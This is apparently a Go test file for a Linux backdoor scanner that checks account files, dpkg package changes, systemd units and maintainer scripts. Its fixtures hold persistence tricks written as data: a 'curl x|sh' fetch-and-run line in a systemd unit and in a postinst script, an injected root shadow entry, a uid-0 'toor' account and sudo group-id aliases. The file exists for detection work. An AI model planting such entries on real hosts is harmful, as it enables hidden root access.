	for _, kind := range []string{pkgverify.KindUnsupportedArch, pkgverify.KindPro, pkgverify.KindBudget, pkgverify.KindNotHashed, pkgverify.KindNotChecked, ""} {
		r := run(c, nil, res(kind, "reason"))
		must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
		absent(t, r, "pkg.unchecked_changes")
	}
	r := run(c, nil, res(pkgverify.KindHostArch, `host architecture "riscv64" is not supported for package verification`))
	absent(t, r, "pkg.unverifiable:/usr/bin/sudo")
	absent(t, r, "pkg.unverifiable")
	absent(t, r, "pkg.unchecked_changes")
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "riscv64") }) {
		t.Errorf("scan limit not stated: %q", r.CouldNotRuleOut)
	}
}

// R60: a version no trusted source has explains none of its files, programs
// or not.
func TestJudgeUnconfirmedVersionExplainsNoFile(t *testing.T) {
	old := sshBase()
	cur := clone(old)
	v := "1:9.2p1-2+deb12u9"
	setVersion(cur, "openssh-server", v)
	unit := "ExecStartPre=/bin/sh -c 'curl x|sh'\nExecStart=/usr/sbin/sshd -D"
	setFile(cur, file("/usr/lib/systemd/system/ssh.service", unit, 0o644))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/lib/systemd/system/ssh.service", Package: "openssh-server", Version: v, Actual: h(unit), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/lib/systemd/system/ssh.service") {
		t.Errorf("changed unit not listed: %+v", f.Evidence)
	}
	if explained(r, "explained:openssh-server") != nil || r.ExitCode != 2 {
		t.Errorf("explained or wrong exit %d", r.ExitCode)
	}
}

// R59: the account files as glibc reads them; duplicates and rejected lines
// are backdoor signs, and only a clean file gets the ageing/GECOS note.
func TestJudgeAccountFileAnomalies(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/etc/shadow", "root:$y$orig:20000:0:99999:7:::", 0o640))
	cur := clone(old)
	// A root line prepended: glibc uses it, so the collector does too, and
	// records the duplicate.
	setFile(cur, file("/etc/shadow", "root:$6$attacker:20000:0:99999:7:::\nroot:$y$orig:20000:0:99999:7:::", 0o640))
	cur.Accounts.Users[0].Password.Digest = "digest-attacker"
	cur.Accounts.Duplicates = []string{"/etc/shadow:root"}
	r := run(cur, snapOf(old), nil)
	must(t, r, "acct.duplicate:/etc/shadow:root", model.SevBackdoor)

	// The file changed and the comparison saw nothing, but it holds a
	// rejected line: not the ageing note.
	cur2 := clone(old)
	setFile(cur2, file("/etc/shadow", "root:$y$orig:20000:0:99999:7:::\nroot:$6$x", 0o640))
	cur2.Accounts.Malformed = []string{"/etc/shadow:2"}
	r = run(cur2, snapOf(old), nil)
	must(t, r, "acct.malformed:/etc/shadow:2", model.SevBackdoor)
	must(t, r, "snap.file_modified:/etc/shadow", model.SevBackdoor)

	// A new group with a privileged group's id is as privileged.
	old3 := clean()
	cur3 := clone(old3)
	cur3.Accounts.Groups = append(cur3.Accounts.Groups, model.Group{Name: "sudo2", GID: 27, Members: []string{"eve"}})
	must(t, run(cur3, snapOf(old3), nil), "snap.group:sudo2", model.SevBackdoor)
}

// A system directory handed to an ordinary account is a backdoor sign even
// when its mode stays the same.
func TestJudgeDirectoryGivenAway(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, model.FileEntry{Path: "/usr/local/sbin", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/etc/systemd/system", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken})
	cur := clone(old)
	setFile(cur, model.FileEntry{Path: "/usr/local/sbin", Type: "dir", Mode: 0o040755, UID: 1000, MTime: changed, CTime: changed})
	setFile(cur, model.FileEntry{Path: "/etc/systemd/system", Type: "dir", Mode: 0o040755, UID: 1000, MTime: changed, CTime: changed})
	r := run(cur, snapOf(old), archive())
	for _, p := range []string{"/usr/local/sbin", "/etc/systemd/system"} {
		f := must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
		if !strings.Contains(f.Fix, "chown 0:0") {
			t.Errorf("%s fix %q", p, f.Fix)
		}
	}
}

// N3: an exception on a package change covers exactly the files it
// accepted; other content at the same version is a finding again.
func TestJudgePackageExceptionsCoverFileContents(t *testing.T) {
	old := sshBase()
	v := "1:9.2p1-2+deb12u9+local1"
	s := snapOf(old)
	cur, res := upgradeSSH(old, v, "my patched sshd", pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
	f := must(t, run(cur, s, res), "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	s.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
	absent(t, run(cur, s, res), "snap.pkg_upgraded:openssh-server")
	cur2, res2 := upgradeSSH(old, v, "attacker sshd", pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
	must(t, run(cur2, s, res2), "snap.pkg_upgraded:openssh-server", model.SevBackdoor)

	// A new package.
	old2 := clean()
	s2 := snapOf(old2)
	mk := func(content string) (*model.Collection, *pkgverify.Result) {
		c := clone(old2)
		c.Packages.Installed = append(c.Packages.Installed, pkg("foo", "1.0", "/usr/bin/foo"))
		c.Files = append(c.Files, file("/usr/bin/foo", content, 0o755))
		r := archive()
		r.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/bin/foo", Package: "foo", Version: "1.0", Actual: h(content), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
		return c, r
	}
	c3, r3 := mk("foo v1")
	f = must(t, run(c3, s2, r3), "snap.pkg_installed:foo", model.SevBackdoor)
	s2.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
	absent(t, run(c3, s2, r3), "snap.pkg_installed:foo")
	c4, r4 := mk("foo trojaned")
	must(t, run(c4, s2, r4), "snap.pkg_installed:foo", model.SevBackdoor)

	// The note on unchecked files.
	s3 := snapOf(old)
	cur5, res5 := upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd a", pkgverify.KindUnreachable, "timeout")
	u := must(t, run(cur5, s3, res5), "pkg.unchecked_changes", model.SevNote)
	s3.Exceptions = []model.Exception{{FindingKey: u.Key, AcceptedValue: currentValue(u), At: taken}}
	absent(t, run(cur5, s3, res5), "pkg.unchecked_changes")
	cur6, res6 := upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd b", pkgverify.KindUnreachable, "timeout")
	must(t, run(cur6, s3, res6), "pkg.unchecked_changes", model.SevNote)
}

// An architecture edited in dpkg status shows as an install and a removal
// of the same name; the package is judged once, as the one installed now.
func TestJudgeArchitectureSwitch(t *testing.T) {
	old := sshBase()
	cur := clone(old)
	for i := range cur.Packages.Installed {
		if cur.Packages.Installed[i].Name == "openssh-server" {
			cur.Packages.Installed[i].Arch = "mips64el"
		}
	}
	setFile(cur, file("/usr/sbin/sshd", "trojan sshd", 0o755))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "1:9.2p1-2+deb12u3", Actual: h("trojan sshd"), Reason: `unsupported architecture "mips64el"`, Kind: pkgverify.KindUnsupportedArch}}
	r := run(cur, snapOf(old), res)
	absent(t, r, "snap.pkg_removed:openssh-server")
	f := must(t, r, "snap.pkg_installed:openssh-server", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/sbin/sshd") {
		t.Errorf("evidence %+v", f.Evidence)
	}
}

// A collection that still lists a group twice.
func TestJudgeDuplicateGroupEntries(t *testing.T) {
	c := clean()
	c.Accounts.Groups = append(c.Accounts.Groups, model.Group{Name: "sudo", GID: 27, Members: []string{"eve"}})
	must(t, run(c, nil, nil), "acct.duplicate:/etc/group:sudo", model.SevBackdoor)
}

// --- review round 3 ---

type acctFiles struct{ passwd, shadow, group, gshadow string }

var acctBase = acctFiles{
	passwd:  "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n",
	shadow:  "root:$y$orig:20000:0:99999:7:::\nalice:$y$alice:20000:0:99999:7:::\n",
	group:   "root:x:0:\nsudo:x:27:alice\nstaff:x:50:\nusers:x:100:\nalice:x:1000:\n",
	gshadow: "root:*::\nsudo:!::alice\nstaff:*::\nusers:*::\nalice:!::\n",
}

// collectAccounts runs the real collector on account files written to a
// fresh root and puts the result, and the files' entries, on a collection.
func collectAccounts(t *testing.T, a acctFiles) *model.Collection {
	t.Helper()
	d := t.TempDir()
	if err := os.MkdirAll(filepath.Join(d, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	c := clean()
	for name, body := range map[string]string{"passwd": a.passwd, "shadow": a.shadow, "group": a.group, "gshadow": a.gshadow} {
		if err := os.WriteFile(filepath.Join(d, "etc", name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		perm := uint32(0o644)
		if name == "shadow" || name == "gshadow" {
			perm = 0o640
		}
		setFile(c, file("/etc/"+name, body, perm))
	}
	c.Accounts, _ = collect.Accounts(d, ctx.DigestKey)
	return c
}

func acctRun(t *testing.T, before, after acctFiles) *model.Report {
	t.Helper()
	return run(collectAccounts(t, after), snapOf(collectAccounts(t, before)), archive())
}

// Account file attacks, collected the way glibc reads the files.
func TestJudgeAccountAttacksEndToEnd(t *testing.T) {
	b := acctBase
	for _, tc := range []struct {
		name  string
		after acctFiles
		keys  []string
	}{
		{"shadow prepend", acctFiles{b.passwd, "root:$6$attacker:20000:0:99999:7:::\n" + b.shadow, b.group, b.gshadow}, []string{"acct.duplicate:/etc/shadow:root"}},
		{"4-field passwd uid 0", acctFiles{b.passwd + "toor:x:0:0\n", b.shadow, b.group, b.gshadow}, []string{"snap.user_added:toor"}},
		{"2-field gshadow replaces", acctFiles{b.passwd, b.shadow, b.group, "root:*::\nsudo:$6$grouphash\nstaff:*::\nusers:*::\nalice:!::\n"}, []string{"snap.group:sudo"}},
		{"2-field gshadow prepended", acctFiles{b.passwd, b.shadow, b.group, "root:*::\nsudo:$6$grouphash\nsudo:!::alice\nstaff:*::\nusers:*::\nalice:!::\n"}, []string{"snap.group:sudo", "acct.duplicate:/etc/gshadow:sudo"}},
		{"2-field gshadow appended", acctFiles{b.passwd, b.shadow, b.group, b.gshadow + "sudo:$6$grouphash\n"}, []string{"acct.duplicate:/etc/gshadow:sudo"}},
		{"duplicate group line", acctFiles{b.passwd, b.shadow, b.group + "sudo:x:27:eve\n", b.gshadow}, []string{"acct.duplicate:/etc/group:sudo"}},
		{"duplicate group line prepended", acctFiles{b.passwd, b.shadow, "sudo:x:27:alice,eve\n" + b.group, b.gshadow}, []string{"snap.group:sudo"}},
		{"gid alias", acctFiles{b.passwd, b.shadow, b.group + "wheel2:x:27:eve\n", b.gshadow}, []string{"snap.group:wheel2"}},
		{"user with primary gid sudo", acctFiles{b.passwd + "eve:x:1001:27::/home/eve:/bin/bash\n", b.shadow + "eve:$y$eve:20000:0:99999:7:::\n", b.group, b.gshadow}, []string{"snap.user_added:eve"}},
		{"primary gid changed to sudo", acctFiles{"root:x:0:0:root:/root:/bin/bash\nalice:x:1000:27::/home/alice:/bin/bash\n", b.shadow, b.group, b.gshadow}, []string{"snap.user_changed:alice"}},
		{"uid 2^32", acctFiles{b.passwd + "big:x:4294967296:0::/:/bin/sh\n", b.shadow, b.group, b.gshadow}, []string{"acct.malformed:/etc/passwd:3"}},
		{"empty-name group gid 27", acctFiles{b.passwd, b.shadow, b.group + ":x:27:eve\n", b.gshadow}, []string{"acct.malformed:/etc/group:6 (empty name, gid 27, members eve)"}},
		{"empty-name uid 0 first", acctFiles{":x:0:0::/tmp/x:/tmp/x/sh\n" + b.passwd, b.shadow, b.group, b.gshadow}, []string{"acct.malformed:/etc/passwd:1 (empty name, uid 0)"}},
		{"empty-name gshadow", acctFiles{b.passwd, b.shadow, b.group, b.gshadow + ":$6$grouphash::eve\n"}, []string{"acct.malformed:/etc/gshadow:6 (empty name)"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := acctRun(t, b, tc.after)
			for _, k := range tc.keys {
				must(t, r, k, model.SevBackdoor)
			}
			if r.ExitCode != 2 {
				t.Errorf("exit %d (%v)", r.ExitCode, keys(r))
			}
		})
	}

	// An out-of-range first line is dropped by glibc, so the next line for
	// the same name counts: alice is uid 0.
	r := acctRun(t, b, acctFiles{"root:x:0:0:root:/root:/bin/bash\nalice:x:4294968296:1000::/home/alice:/bin/bash\nalice:x:0:0::/home/alice:/bin/bash\n", b.shadow, b.group, b.gshadow})
	f := must(t, r, "snap.user_changed:alice", model.SevBackdoor)
	if !strings.Contains(f.Evidence[0].After, "uid 0") {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
	must(t, r, "acct.malformed:/etc/passwd:2", model.SevBackdoor)
	m := must(t, acctRun(t, b, acctFiles{":x:0:0::/tmp/x:/tmp/x/sh\n" + b.passwd, b.shadow, b.group, b.gshadow}), "acct.malformed:/etc/passwd:1 (empty name, uid 0)", model.SevBackdoor)
	if !strings.Contains(m.Title, "uid 0") {
		t.Errorf("title %q", m.Title)
	}
}

// R61: whether the archive could be reached is decided once per scan. With
// the host's indexes read, any per-package failure is "no trusted source
// confirmed it" (the probe: a 9 KB version reached HTTP 414 at the snapshot
// service); only failing base indexes fold into the note.
func TestJudgeReachabilityIsPerScan(t *testing.T) {
	old := sshBase()
	v := "1:9.2p1-2+deb12u9" + strings.Repeat("a", 9000)
	cur, res := upgradeSSH(old, v, "trojan sshd", pkgverify.KindNotFound, "the version in dpkg status is not a valid Debian version, so no source was asked")
	r := run(cur, snapOf(old), res)
	must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")

	cur, res = upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd 2", pkgverify.KindUnreachable, "could not read the official archive index: dial tcp: i/o timeout")
	r = run(cur, snapOf(old), res)
	absent(t, r, "snap.pkg_upgraded:openssh-server")
	must(t, r, "pkg.unchecked_changes", model.SevNote)
}

// R61: /etc/os-release naming a release telltale does not verify: special
// files are a backdoor sign each, other files one note, and the report says
// verification did not run. An unsupported host architecture is only said.
func TestJudgeVerificationDidNotRun(t *testing.T) {
	c := clean()
	c.Host.OSID, c.Host.OSVersionID = "debian", "99"
	c.Packages.Installed = append(c.Packages.Installed, pkg("sudo", "1.9.13p3-1+deb12u1", "/usr/bin/sudo"), pkg("jq", "1.6-2.1", "/usr/bin/jq"))
	c.Files = append(c.Files, file("/usr/bin/sudo", "sudo", 0o4755), file("/usr/bin/jq", "jq", 0o755))
	verdicts := func(kind, reason string) *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
			{Path: "/usr/bin/sudo", Package: "sudo", Reason: reason, Kind: kind},
			{Path: "/usr/bin/jq", Package: "jq", Reason: reason, Kind: kind}}}
	}
	r := run(c, nil, verdicts(pkgverify.KindRelease, `release not supported for package verification: "debian" "99"`))
	must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
	must(t, r, "pkg.unverifiable", model.SevNote)
	absent(t, r, "pkg.unverifiable:/usr/bin/jq")
	if !slices.Contains(r.CouldNotRuleOut, "package verification did not run: /etc/os-release says debian 99") {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}

	r = run(c, nil, verdicts(pkgverify.KindHostArch, `host architecture "riscv64" is not supported for package verification`))
	absent(t, r, "pkg.unverifiable:/usr/bin/sudo")
	absent(t, r, "pkg.unverifiable")
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "host architecture") }) {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}
}

// R61: a deadline never folds: what was left is stated, and special files
// of a changed package stay backdoor signs.
func TestJudgeDeadlineDoesNotFold(t *testing.T) {
	old := sshBase()
	old.Packages.Installed = append(old.Packages.Installed, pkg("sudo", "1.9.13p3-1+deb12u1", "/usr/bin/sudo"))
	old.Files = append(old.Files, file("/usr/bin/sudo", "sudo", 0o4755))
	cur := clone(old)
	setVersion(cur, "sudo", "1.9.13p3-1+deb12u9")
	setFile(cur, file("/usr/bin/sudo", "trojan sudo", 0o4755))
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u9")
	setFile(cur, file("/usr/sbin/sshd", "sshd 2", 0o755))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{
		{Path: "/usr/bin/sudo", Package: "sudo", Reason: "check stopped: context deadline exceeded", Kind: pkgverify.KindStopped},
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Reason: "check stopped: context deadline exceeded", Kind: pkgverify.KindStopped}}
	r := run(cur, snapOf(old), res)
	must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
	must(t, r, "snap.pkg_upgraded:sudo", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")
	if explained(r, "explained:openssh-server") != nil {
		t.Errorf("an upgrade nothing checked is explained")
	}
	if !slices.Contains(r.CouldNotRuleOut, "verification stopped before 2 packages were checked") {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}
}

// A rebuilder's version change explains a rebuilt initramfs only when
// something confirms the new version (one of its files verified): a
// hand-edited version bump explains nothing.
func TestJudgeFakeRebuilderBump(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("initramfs-tools", "0.142", "/usr/sbin/update-initramfs"))
	old.Files = append(old.Files, file("/usr/sbin/update-initramfs", "u-i", 0o755), file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644))
	cur := clone(old)
	setVersion(cur, "initramfs-tools", "0.142+deb12u9")
	setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd with implant", 0o644))
	must(t, run(cur, snapOf(old), archive()), "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)

	// The real upgrade: its changed program verified.
	setFile(cur, file("/usr/sbin/update-initramfs", "u-i 2", 0o755))
	res := archive(pkgverify.FileVerdict{Path: "/usr/sbin/update-initramfs", Package: "initramfs-tools", Version: "0.142+deb12u9", Expected: h("u-i 2"), Actual: h("u-i 2"), Source: "archive"})
	absent(t, run(cur, snapOf(old), res), "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64")
}

// A package installed for a second architecture while the same name is
// upgraded is judged as an install.
func TestJudgeSecondArchitectureInstall(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("foo", "1.0-1", "/usr/bin/foo"))
	old.Files = append(old.Files, file("/usr/bin/foo", "foo1", 0o755))
	cur := clone(old)
	setVersion(cur, "foo", "1.0-2")
	setFile(cur, file("/usr/bin/foo", "foo2", 0o755))
	i386 := pkg("foo", "1.0-2", "/usr/lib/i386-linux-gnu/foo/helper")
	i386.Arch = "i386"
	cur.Packages.Installed = append(cur.Packages.Installed, i386)
	cur.Files = append(cur.Files, file("/usr/lib/i386-linux-gnu/foo/helper", "helper", 0o4755))
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/foo", Package: "foo", Version: "1.0-2", Expected: h("foo2"), Actual: h("foo2"), Source: "archive"},
		pkgverify.FileVerdict{Path: "/usr/lib/i386-linux-gnu/foo/helper", Package: "foo", Version: "1.0-2", Expected: h("helper"), Actual: h("helper"), Source: "archive"})
	f := must(t, run(cur, snapOf(old), res), "snap.pkg_installed:foo:i386", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/lib/i386-linux-gnu/foo/helper") {
		t.Errorf("evidence %+v", f.Evidence)
	}
}

// R62: a dpkg maintainer script runs as root at the next package
// operation, so a changed one folds into a package change only when the
// new version is confirmed; dpkg's other records still fold.
func TestJudgeMaintainerScripts(t *testing.T) {
	old := clean()
	old.Files = append(old.Files,
		file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\nexit 0", 0o755),
		file("/var/lib/dpkg/info/openssl.triggers", "activate-noawait ldconfig", 0o644),
		file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
	cur := clone(old)
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	setFile(cur, file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\ncurl x|sh", 0o755))
	setFile(cur, file("/var/lib/dpkg/info/openssl.triggers", "interest /usr/bin", 0o644))
	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))

	r := run(cur, snapOf(old), archive())
	for _, p := range []string{"/var/lib/dpkg/info/openssl.postinst", "/var/lib/dpkg/info/openssl.triggers"} {
		f := must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
		if !strings.Contains(f.Why, "runs as root") {
			t.Errorf("%s why %q", p, f.Why)
		}
	}
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.md5sums")

	// The upgrade confirmed by a verified file: its scripts are its own.
	setFile(cur, file("/usr/bin/openssl", "openssl 3.0.15", 0o755))
	res := archive(pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("openssl 3.0.15"), Actual: h("openssl 3.0.15"), Source: "archive"})
	r = run(cur, snapOf(old), res)
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.postinst")
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.triggers")
}

// R63: a recorded version change with no changed files that nothing
// confirmed is a note, not an explained upgrade.
func TestJudgeVersionOnlyChange(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
	cur := clone(old)
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))
	r := run(cur, snapOf(old), archive())
	f := must(t, r, "snap.pkg_version_only:openssl", model.SevNote)
	if want := "The recorded version of openssl changed from 3.0.14-1~deb12u2 to 3.0.15-1~deb12u1, but no files changed and the new version could not be confirmed"; f.Title != want {
		t.Errorf("title %q", f.Title)
	}
	if explained(r, "explained:openssl") != nil {
		t.Errorf("unconfirmed version change explained")
	}
	// Confirmed by a verified file, it is an explained upgrade.
	r = run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Source: "archive"}))
	absent(t, r, "snap.pkg_version_only:openssl")
	if explained(r, "explained:openssl") == nil {
		t.Errorf("confirmed upgrade not explained")
	}
}
